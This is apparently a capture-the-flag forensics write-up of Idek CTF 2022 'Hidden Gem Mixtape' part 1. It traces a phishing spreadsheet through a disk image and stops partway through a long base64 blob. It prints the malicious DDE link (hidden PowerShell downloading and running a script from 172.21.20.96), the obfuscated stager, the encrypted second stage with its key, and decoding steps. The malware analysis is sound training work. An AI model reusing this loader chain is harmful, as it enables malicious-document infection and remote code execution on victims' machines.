+++
title = "Hidden Gem Mixtape - Writeup"
draft = false
ShowToc = true
author = ["connar"]
+++

## Intro
This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author **bquanman** for providing the chall and giving me the change to play them after 3 years:D

In this challenge we are given a `.pcap` file and a `.vhdx` file and the challenge consists of 3 parts.

The description of the part 1 states as follows:
```
We're pretty sure there's been a hack into our system. The incident is suspected to be caused by an employee opening a document file received via email even though he deleted it shortly afterwards. We managed to do a logical acquisition of data from his hard drive. However, when we open the document file, it looks empty, can you analyze what it contains?
```

This gives out a hint into looking for an email with a malicious attachment, so let's start analyzing the `.vhdx` filesystem to maybe find out such an email.

## Part 1 - Analyzing initial Access
To analyze filesystems, usually you will go with Autopsy or FTK Imager. Since I did not have a Raw file or an E01 one, and since I had issues converting the `.vhdx` into one of the forementioned filetypes, I just mounted the provided `.vhdx` (just right click-> Mount) and then loaded the `C:\\` folder of the mounted drive into the logical files of Autopsy, which yielded the result I was looking for:  

![alt text](/posts/writeups/training/idek2022/autopsy1.png)

Searching a bit and thinking of all the possible initial ways to infliltrate a machine, we land on the following sus email:  

![alt text](/posts/writeups/training/idek2022/autopsy2.png)

Downloading the attachment and decompressing the file with the given password, we get a file named `Policy.xslx`. If we upload it in any online tool such as virus total or any.run, we will see that this is definitely a malicious file. If we manually want to see the part it is malicious at, we can extract the files of the `xslx` (since xlsx,doc, docx etc contain other files that have been put together):  

```sh
└─$ unzip Policy.xlsx 
Archive:  Policy.xlsx
...

──(connar㉿kali)-[~/Downloads/ecscTraining/idek2022]
└─$ ls
 Policy.xlsx  '[Content_Types].xml'   _rels   docProps   xl
                                                                                                
┌──(connar㉿kali)-[~/Downloads/ecscTraining/idek2022]
└─$ grep -i "cmd" -r .                                               
./xl/externalLinks/externalLink1.xml:<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><ddeLink xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" ddeService="cmd" ddeTopic="/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&quot;http://172.21.20.96/windowsupdate.ps1\&quot;);IEX $e"><ddeItems><ddeItem name="_xlbgnm.A1" advise="1"/><ddeItem name="StdDocumentName" ole="1" advise="1"/></ddeItems></ddeLink></externalLink>
```

We can see the following dde data:
```d
ddeService="cmd" ddeTopic="/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(\&quot;http://172.21.20.96/windowsupdate.ps1\&quot;);IEX $e"
```

If we try to access this IP to download the powershell script, we will not be able to retrieve it as it is a local IP in which we don't have access to. But we remember that we have the whole filesystem, and thus we probably can retrieve the data of this `windowsupdate.ps1` from the powershell logs of the system. Searching in Autopsy for the IP, we get three hits back:  

![alt text](/posts/writeups/training/idek2022/autopsy3.png)  

Looking around the powershell logs, we will find out that the contents of this `windowsupdate.ps1` is the following obfuscated code:  
```ps1
& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( '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' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
```

The obfucsated powershell code constructs the `iex` word for executing the obfuscated powershell code. We know that it uses `iex` from the `& ( $sHEllid[1]+$sheLLiD[13]+'X')` part, which we can validate through a powershell terminal:  
```powershell
(base) PS C:\Users\user> echo $shellid
Microsoft.PowerShell

(base) PS C:\Users\user> echo $shellid[1]$shellid[13]
i
e
```
For the rest of the payload, we only need to decode from base64 and decompress:  

![alt text](/posts/writeups/training/idek2022/cyberchef_payloadDecode.png)

```powershell
(New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL ' ', ('76492d1116743f0423413b16050a5345MgB8AHUAQgAxAEsAZQBQAE8AUQA4AHQAVAB5ADEAcwBXAFYALwBVADcAUAAyAGcAPQA9AHwAMQAzADcAMwAwAGIAOQA2ADMANQAwAGYAOABlADUAOQAxAGEAMgA4ADAAOQAzAGQAMABjADYAZgA2ADQAOAAxAGYAZAA4AGUAMAA2ADIANABmADQAMgAzADMAYwAxAGQANgA4ADEANgAwADcANgA1AGYANgBjAGUAZQA1ADAAMwA4ADMAZQA5AGMAOQAzAGUAYgBhAGIANgA1ADEANQBjAGYAYwBiADIAOQA2ADcAYgA4AGEAZAA3AGYANABhAGYAYgA2ADgANQAyADkAOAA1ADUAYQA2ADkAMwAzADMANwBkADIAOQA1ADkAZgBhADkANAA1AGYANwA1ADIAZAA2AGMAMgBhADYANQBjADAAYwA4AGEAYQA0AGYAZQBiAGUAYgA2AGQAOQA4AGIAOAA1AGYAZAA1ADMANgBkADYANQBkADMAZQBiADAANQBjADkAMABmADMANQA0AGYAOQBiADMAMQA2ADkAOQAyADcAZgA2ADcAZgBiADAAYQAxAGYANAAzAGIAYQBjADQANwA2ADgAYwA4ADYAOAA2ADcAYwA2ADAAZABkADkAOQAwADAAYgAzADYAMgA2ADUAZQA0AGYANAA2AGEAYgAwAGMAOAAwADAANQA4ADkANQBlAGYAYwBhADkANAAwADEANgBkADgAMwAzAGEAYQBlADMAMgAxAGEAMQBiADAAMwAwADQANQA1ADQAYQAzADIAYwA4AGQAZQBkADUAZABlAGIAMwA2ADgAYgA4AGYANAAyADUAZAAxADIAOAA0AGYANwA2ADcAMABjADMAOAA1ADMAMwAyADkAZQA2AGEANwBmADAAZAA2ADUAMwBkADkAYgAzADcAMgA4ADEAZAA2AGIANwAwADUAYwA0ADMAYQAwAGUAZgA0ADYAZQBiADkAYgA5ADcANQA5ADkAYQA0ADEAMgBhADQAYQA4ADYAMQBhADIAYgA4ADcANwAzADIAMABjADIAMQA3ADgAYwA0ADIAYwA0ADYAZgAwAGIANQBmAGEAYQA3AGIANQBlADMANgAwAGEANwAwAGMAMgBlADgAYQA5ADAAYwBlADkAMgBjADgAMgA3ADIAMAA4ADMANwBiAGQANAA1AGYAOQBlADQANABkADkAMgBiADAAZQBiADgAYgA4ADQAZQA2AGQANgBlADAAYgA5ADcANQBhAGQAYQA2ADMAZgAwADcAMAA3ADcAYgA5AGYAYwAxADcANQBjADUANgAwAGMAZQA4ADYAZAA4ADkAZABhADgAOQA1AGQAMQA5AGEAMQAzADUANgAxADUAMAAyAGQANgA2AGMAZQBmAGQAYwBlADUAMABiADAAYQA5ADIAOABlADMAZABkAGUANAAzADIAZgAwAGEANgA3ADkANQA3ADYANgA3ADIAOQBjAGUANgBkADQAZAAwAGUAZAAwADgAZAA5ADQANgBlADYAMwAyADIANQAyADkANABmADgAYwA5ADkAMAA0AGQAZgBkADEAYwAxAGUAOQAxADcAZgAyAGMANQBkAGYAMwAzADMANgBlAGEAZgBmAGMANgBjAGMAZABkAGQAMAA5ADAAZQAzADQAZAAwADYAZAAyADUAMwA2AGMANgA2ADAANAAyADUANgA2ADUAYwA0ADQAZQAyADIAMgBmADAANQAyAGEAYwA5ADAAZAAzADYAZAAzAGYAYQA2AGEAOAA0ADIAOQAwADAAMQAwAGYAOQBhADAAMwBkAGYAMQBiAGMANgAwAGMAZAA4ADEANAA5AGEAMwAyAGQAOQBlADcANwBkADEAYQBiADUANQA0ADIAZABhADQANwBmADAAYQA2ADYAMAAyADEANABmADAAMgAyAGEAMQAxAGQANgBjADgAOQA2ADYAYgA1AGQANQAwADIAMwBiADQANwAxADkAZgA5AGIANAA4AGQAYwAwADAANABiADIANgA2ADEAMwAwADIAYQA1ADIAOQA2ADgAOQBmADgANgAwAGUAYwAyAGUANwAyAGUANAA1AGEAZABhAGEAMgA5ADQAZQAxAGUAMgA0ADcAMQAzAGYANAAyADMAYQAzAGMAZgBlAGEANQA0ADQAYQBmADEAZAA1AGYANQBiADQANQA2ADgAZQBhAGYAZQA4ADYAYgBhADgAMgBjADAAZQBjADIAMQAyADQAMgAyADAANAA4ADAAMAAyAGIAMgBiAGQANwBjAGYAYQA3ADIAMABhAGMANgA1AGYAZgA4ADcAZQA2ADcANwA5AGQAMAA2AGEANgBlADkAZgA1AGIAOQA0AGEAMwBiADAANgA4ADMAZAAwADQANQBkAGIAYwBmAGEANwBiADkAMAA1ADgAMABiAGYAYgA1AGEAMgAxAGUAMQA0ADgANgAzADgAYQAwADcANQBlADUAYgA5AGUAYgAxADQANQA2AGQAYgAzADEAZgA0AGQAZQBiADMAZABlADIANQBiAGYANgA5AGUANQA5ADYAYgA4AGEAMgBjADcAYgA5ADUAOAAxAGMAZQAwADcAZAAzADQAMwA0ADIAMwA5ADMAYQAyADUAMQBkADUAYgBlADQANABmADgAMgBiADYAMgA3ADgAYgAxAGMAMQBhAGMANQAyAGQANgBlADcANAA1AGYANAA5ADMAMAA5ADcANwBkAGIAMwA0AGUAYQBjADEANwAwAGUAZQBhADEAZQAzADUAZAA0ADIAYQBjADAAMQA2ADYAOABlADQAMAAxADcANwA4AGUAZABjADgAZAA5AGIAZQA0ADcANgBmADAANwBiADgAOAA4ADIAYgA4AGIAYwA2ADgAZQA3ADgAYQA2AGQAMwAzAGMAZQBlAGUANQAzADIAZQBkAGMAYQBhADkANwBhAGEAOAAwADEAZgA0ADEAMwAxADAAYwA2AGEAZgBmAGMAZgBlADEAYQA5ADcAOAAxADEAOQAwADEAYwBkADIAOQAwAGYANgBhADkAYwBlAGQAYQBmADYAYwBmADYAOAA1ADMAMAAxADQANgA2ADUAZABhADMAYgAwADEAZQAwADgAMwAxADMAMgA5ADYAOQA1AGYANAAwADgAOABjAGYANABmAGEAMgAxADQAZQA3ADUAMgA2ADQAOABhAGMAYgBlADAAYgA2ADcAYwAyAGMAOQA0AGIAMwBlAGIANAAxADkAMwAyAGIAZQBhADMANQA4AGUAOQBkAGQANQA3AGUAYgAyADcAZABmADQAZQBiADQAOQBmADQAMAA5AGEAOABhADYAOABhAGIAZQBlADAAYQA2ADUAZgA3ADEANQBkADIANABiADcAYwAxAGIANQAwADgAZQBlAGUAMQBjAGEANAA1ADYAMgBiAGYAMwA4ADAAMwBiADIAZgAwADAAYQAxADEAOAAwADQAYgA3ADcAMwBhADEANABkAGQANQA1ADQAZgA1AGMAMAA5ADQAOQA0ADAAZgA3AGIAMwA3AGIAMwAxADAAZQBjADQAYQA3ADYAMQBkADQAOQA3AGEAOABiAGYAZgBhAGMAZQAyADAAMgA3ADIAOQAxADIAZgBhADQAYwBhADkAYwA4ADAANwA0ADUANwAyADgAZQAzADUAMQBlADIAMgA1ADYAMAAwADAAOAAyAGIAYQA4AGYAZQBiAGEAMAA3AGYAMgBjAGIANgBkAGMAZgAxAGIAYgA4ADEAMgA4ADAANQA3ADMANAA3ADcAOQA5AGUANQA2ADUAMQAwAGQANAA1AGYANQAyAGQAYwBiADUAZgAzADgAMABmADIANwAxAGMAZQBhAGYAOABiADUANQBiAGQAZgBkAGMAMABjAGIANwBjADAANAA5AGYAZABkADAAMgAwADAAYwA5ADcAYwA3ADQANwBkADQAYgAwAGYAZABkAGYAMwAzADUAZQAwADgAZAAyADIAYQA4ADQAOQBlADgAZgBjAGMAMgAzADcANAAyADcAZgBhADMAZgA4ADUAMgBhADAANQAxADkAYgAyAGQAYwBjADQAOQA1ADUANwAwADUAYgA0ADgAOQBkADEAYwAzADgAMAA3ADUAOAA5AGEAYQBiADYAZQA5ADEAYQAxADMAMgBkADYAZAA5ADYAMQAzAGQAZAA2AGYANQAyAGQANgA1ADIAMAA5ADUAYgA2AGEAZQBjADkAMQBhAGIANQAyADUAMwA5ADQAMAAyADUAOQA0ADgAZgBmADgANAAwADYAMwBmAGIAMAA4AGQAZgA0ADUAYwAyAGQAOQAwADYANgA5ADkAOABiAGYANAA1ADYAMQAyADUANQA1ADAAYwAzADUAYgAwAGQAMgA0ADUAZAA0AGUAYwAyAGYAMABkADAAOAA1ADgAYgA0ADcANAA1ADIAMAAwADIANwBlADYAYgA2ADUAOABlADMAYgA3ADYAYgBmAGQANQA2ADYAZAAyADYAYwA4ADcANQAzADcAOABjAGMAMQBlADQANABmAGUAOQBhADUAYQBlADkAZABkAGMANQA2ADAAMQBmADYAMAAxADEAOQA3AGIAYwBiAGUANwA2ADIAZAA4ADkAYQA4AGEAMgBlAGQAMgA4ADQANAA4ADcANAA4AGEAYgA0AGIAMgA5ADgAOQBhAGUAMQAzADUAMwBkADMAMAA5ADMANQA1ADMAMQAyADEAYQBhADkAOAA2ADgAOQBlAGEANwA2ADIANAA3ADgAOQAzAGEAYwA0ADkAYgBhAGMAMwBmAGQAZABiADYAZgA3ADAAZABkADIAMQA3ADAAYQA4ADQAOQBlADYANgAxADkAYQA3ADMAMgA0ADgAOQA2ADcAOQBkADEAYQBmAGYANwAzADcAYgA0ADAANgAzADgAZAA1AGYAZgBkADgAOQBjAGIAZgA4ADYAOAAwADcAOQBkADYAMAAxADYAMgBmADcANAAwAGUAOAA4ADYANQAzAGYAMwA5ADMAZQAxADYAMgBmADIAZABjAGEAMAA3ADIAMAA1AGQAYQA5AGYAOABkADMAZAA2AGYAMgAxAGQAYwA0ADAAMgAwADMANQA4AGUAYQBiADYAMQBlAGQAMAA3ADcAYQBlADgAOQBiADEANQA1ADQAZAA1ADgAMQA3ADQAMwBjAGYANQAxAGUAMQAyAGIAZQBjADIAYgBmADIAZgBlADUANAA3ADQAYQA5ADAANwBjADQANgA0AGEAYQAwADMAZAA0AGEAZQA1AGMAZgAzAGMAYgBlAGEAZQA2ADQAMABiADQAMQBhAGEAZQA5ADcAYwAxADAAZQBiADYAMQAyAGMANQAwADUAMQBiAGQAMQBkADUANAAwADQAZQA1AGMANQAzAGUAOAA3ADYAYwA3AGUANwBjADQAZgAzAGMANwAyADgANwA1ADQAOQBhADIAMwA1ADUAMgA2ADAANgA1ADYANwAwADcAMgBiAGUAYwA0ADYAOQA5ADQANgA5AGUAYgA0ADQAMQBjADUAYwA4AGQAMgBjAGIAYQAxADIAMwA3ADYAYQBlAGUAZgA0ADIANgBlAGMAZgA0AGIANQA3ADcAOAAyAGEAYwA2ADMAZQBiADcANgAxADgANABiADcAMgA5ADAAMgA2ADkAZgBlAGEANQBjADgAZgA4AGEAYwBjAGIAMgBkAGYANAA4AGQAOABmADkANgBjAGIAOQA4AGUAOQBjAGMAMwA3ADcAYwAyAGQAZQA2ADQAMwBkADYAMQA5AGIANwAyADYAZQA5ADcAYQA5ADQANQBkADEANgA0AGQANAA2AGQAZQBlADAAZgBlADUAMAAzADkAYwBlAGYAZgBhADQANwA1AGEAMQBkADMAOAA1ADkAMAA1AGIAMAAyADIAMQA1ADEAOQA2AGUAYgA0AGUAOAA1ADYAYgA4ADEAMAA1ADAAYQBlAGUAMgBlADYAYwBkAGEANQBiAGUANwAzADMAZAA1ADAAZgBjADYAMwA5AGEANABlADEAMABmADUAMwA2ADgANQBjADUAYgA5AGIAYQA3AGEAMwA1ADkANgBlADAAMgBiADYAZQA5AGEANgA0ADAAMAA0ADYAOABkAGMAMQAwADIAYwAzADgAOAAzAGIAMQBiADgAZgA1ADUAYQBmADIAZgBkAGMANAAzAGIANgA4AGUAOQBiADgANQBmADIAMAA5AGMAZAA1ADUAYgAyAGMAMwA4AGEAZABiADgAOAAwAGYANQBkADQAZgAzADkAYgA4AGYAOAA3ADIAYwAwAGUAMgAyADYAZgAzADUAOQAzADgANQA3ADYAYwAyADAANQBlADEANwBlADEAZgBjADQAOAAwAGUAZQAyADIANABhADUANwA4ADQAMwBiADIAZAA3ADYAYQBkADUANABhAGIAMwA1ADgANgA1AGYAYwAzAGEAYwA1ADAAMQA2ADgAZABlADMAYQA1AGEANwAxADQAMgBkAGQAZQA4AGMANwA5ADcAYgAzADUANwA3AGYAMgA5ADYAMgBlADcAOQA3AGUAYgBmAGUAMgBiAGIAMwA0ADkAOQAyADcAMwBlADgAZQBmADMAOAAxADUAMwA1ADcANABiADMAMABmADkAMgA3AGMAOAA5AGMANABlAGQAZQA3AGIAYQA2AGYANABkADAAMgBiADYAMgAyADQAZABlAGYANwBhADQAMAAxADMAYgBjADMAYwBjADkAZQBhADcANgBhADMAOAA0AGYAMwAwAGYAOQBmADUAOABlADgAZAAwADgANAAzADAANABlAGEAMwAyAGMAZAAzADgAYgA2ADUAMgBmAGQAMwBjADgANwBhADkAMwAxAGUAMABiADQAMwAzAGIAOAA1AGUAMwAzADEAYgBlAGMAMQBiAGYAYgBmAGIANAAzAGUANwBjAGMAMwAxADMAYwAwAGYAMQBlADAAZgBmAGEAOAAyADEANgA4ADgAMwA3ADMANgA5AGQAMgA2AGEAZAA1ADYAYwBmAGYANgAxADAAOAA3AGQAMwAyADYAMQBlADgAMgAzAGMAOAAxADkAMwBhADYANwA3ADcAYQA3ADMAYgAwAGMAMAA2AGEANwBiAGMAZABmADIAZQBjADUAYwAxADYAMABhAGUANQBlADAAZgA2ADMAOAA3ADEANgA0ADEAOAA1ADUAMgAzADUAYQA5ADMANQA0AGMAOABiADAAMgAwAGQAMgAyAGIANQBmADQAOQBhADQAYQAwADMAZAAxADkAMwAyADQAYgBkADUAMwAzADAANAAxADMAMwAxAGYANwAzADYAMgA1AGYAYwBhAGIAMQA2ADYANgBjAGQANgAwAGIANABkADYAOABhAGQAMQAzADEAMAA4AGYAYwBhAGUAOAA0ADYAYQAyAGMAOAA1AGUAMQA3ADgAOABiAGYANwBjAGMAZQAyADcAZgA1ADAAZQBiAGQAYQAwAGQAOAAyADQANABjADIAYQA4ADMAYQBkADIAOAAxAGUANgBiADMANABlADMAZABiADMAMQA1ADcANABjADEAZQBjAGUAZAAyAGIAMgA4ADEAYwBiADgAMgAwAGEAZgAzADUANgAyAGYAMwA3ADIANABmADkAOAA5ADcANwBiADUANQAzAGYAMgA=' |ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+'x')
```

We notice at the end it pipes the output of the decoded payload into `( $PsHoME[21]+$psHOme[34]+'x')` which again is transated to `iex`:  

```powershell
(base) PS C:\Users\user> ( $PsHoME[21]+$psHOme[34]+'x')
iex
```
If we change the pipe to `iex` into Out-String, we will actually get the decoded data printed to us:  
```
...113,158,254,51,94,175,13,94,42,226,159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).GetneTwoRKCrEDEnTIAl().pASsWoRD |. Out-String
```
Which will return:  
```powershell
(New - OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL ' ', ('76492d1116743f0423413b16050a5345MgB8AHUAQgAxAEsAZQBQAE8AUQA4AHQAVAB5ADEAcwBXAFYALwBVADcAUAAyAGcAPQA9AHwAMQAzADcAMwAwAGIAOQA2ADMANQAwAGYAOABlADUAOQAxAGEAMgA4ADAAOQAzAGQAMABjADYAZgA2ADQAOAAxAGYAZAA4AGUAMAA2ADIANABmADQAMgAzADMAYwAxAGQANgA4ADEANgAwADcANgA1AGYANgBjAGUAZQA1ADAAMwA4ADMAZQA5AGMAOQAzAGUAYgBhAGIANgA1ADEANQBjAGYAYwBiADIAOQA2ADcAYgA4AGEAZAA3AGYANABhAGYAYgA2ADgANQAyADkAOAA1ADUAYQA2ADkAMwAzADMANwBkADIAOQA1ADkAZgBhADkANAA1AGYANwA1ADIAZAA2AGMAMgBhADYANQBjADAAYwA4AGEAYQA0AGYAZQBiAGUAYgA2AGQAOQA4AGIAOAA1AGYAZAA1ADMANgBkADYANQBkADMAZQBiADAANQBjADkAMABmADMANQA0AGYAOQBiADMAMQA2ADkAOQAyADcAZgA2ADcAZgBiADAAYQAxAGYANAAzAGIAYQBjADQANwA2ADgAYwA4ADYAOAA2ADcAYwA2ADAAZABkADkAOQAwADAAYgAzADYAMgA2ADUAZQA0AGYANAA2AGEAYgAwAGMAOAAwADAANQA4ADkANQBlAGYAYwBhADkANAAwADEANgBkADgAMwAzAGEAYQBlADMAMgAxAGEAMQBiADAAMwAwADQANQA1ADQAYQAzADIAYwA4AGQAZQBkADUAZABlAGIAMwA2ADgAYgA4AGYANAAyADUAZAAxADIAOAA0AGYANwA2ADcAMABjADMAOAA1ADMAMwAyADkAZQA2AGEANwBmADAAZAA2ADUAMwBkADkAYgAzADcAMgA4ADEAZAA2AGIANwAwADUAYwA0ADMAYQAwAGUAZgA0ADYAZQBiADkAYgA5ADcANQA5ADkAYQA0ADEAMgBhADQAYQA4ADYAMQBhADIAYgA4ADcANwAzADIAMABjADIAMQA3ADgAYwA0ADIAYwA0ADYAZgAwAGIANQBmAGEAYQA3AGIANQBlADMANgAwAGEANwAwAGMAMgBlADgAYQA5ADAAYwBlADkAMgBjADgAMgA3ADIAMAA4ADMANwBiAGQANAA1AGYAOQBlADQANABkADkAMgBiADAAZQBiADgAYgA4ADQAZQA2AGQANgBlADAAYgA5ADcANQBhAGQAYQA2ADMAZgAwADcAMAA3ADcAYgA5AGYAYwAxADcANQBjADUANgAwAGMAZQA4ADYAZAA4ADkAZABhADgAOQA1AGQAMQA5AGEAMQAzADUANgAxADUAMAAyAGQANgA2AGMAZQBmAGQAYwBlADUAMABiADAAYQA5ADIAOABlADMAZABkAGUANAAzADIAZgAwAGEANgA3ADkANQA3ADYANgA3ADIAOQBjAGUANgBkADQAZAAwAGUAZAAwADgAZAA5ADQANgBlADYAMwAyADIANQAyADkANABmADgAYwA5ADkAMAA0AGQAZgBkADEAYwAxAGUAOQAxADcAZgAyAGMANQBkAGYAMwAzADMANgBlAGEAZgBmAGMANgBjAGMAZABkAGQAMAA5ADAAZQAzADQAZAAwADYAZAAyADUAMwA2AGMANgA2ADAANAAyADUANgA2ADUAYwA0ADQAZQAyADIAMgBmADAANQAyAGEAYwA5ADAAZAAzADYAZAAzAGYAYQA2AGEAOAA0ADI